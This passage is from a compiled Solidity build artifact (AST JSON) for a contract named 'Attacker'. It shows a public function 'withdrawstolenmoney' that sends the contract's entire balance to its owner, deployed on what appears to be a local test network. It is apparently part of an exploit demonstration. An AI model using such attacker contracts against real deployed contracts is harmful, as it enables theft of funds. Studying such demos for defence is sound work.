                  "src": "623:46:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "id": 84,
                              "name": "this",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 4294967268,
                              "src": "711:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_Attacker_$91",
                                "typeString": "contract Attacker"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_Attacker_$91",
                                "typeString": "contract Attacker"
                              }
                            ],
                            "id": 83,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "703:7:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 82,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "703:7:0",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 85,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "703:13:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "id": 86,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberLocation": "717:7:0",
                        "memberName": "balance",
                        "nodeType": "MemberAccess",
                        "src": "703:21:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "arguments": [
                          {
                            "id": 79,
                            "name": "owner",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 7,
                            "src": "687:5:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 78,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "679:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 77,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "679:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 80,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "679:14:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      },
                      "id": 81,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "694:8:0",
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "src": "679:23:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256)"
                      }
                    },
                    "id": 87,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "679:46:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 88,
                  "nodeType": "ExpressionStatement",
                  "src": "679:46:0"
                }
              ]
            },
            "functionSelector": "979fd9f2",
            "id": 90,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "withdrawstolenmoney",
            "nameLocation": "584:19:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 67,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "603:2:0"
            },
            "returnParameters": {
              "id": 68,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "613:0:0"
            },
            "scope": 91,
            "src": "575:157:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          }
        ],
        "scope": 92,
        "src": "79:655:0",
        "usedErrors": []
      }
    ],
    "src": "32:702:0"
  },
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "networks": {
    "5777": {
      "events": {},
      "links": {},
      "address": "0xBAe0B37DF7ad8Bb6c73bBC1aA24286C78B55aDe6",
      "transactionHash": "0x7b6b93de650be8b5eb36198c91d63e5c109235e210088706fe50720b1ef4415b"
    }
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-04-21T17:54:05.759Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}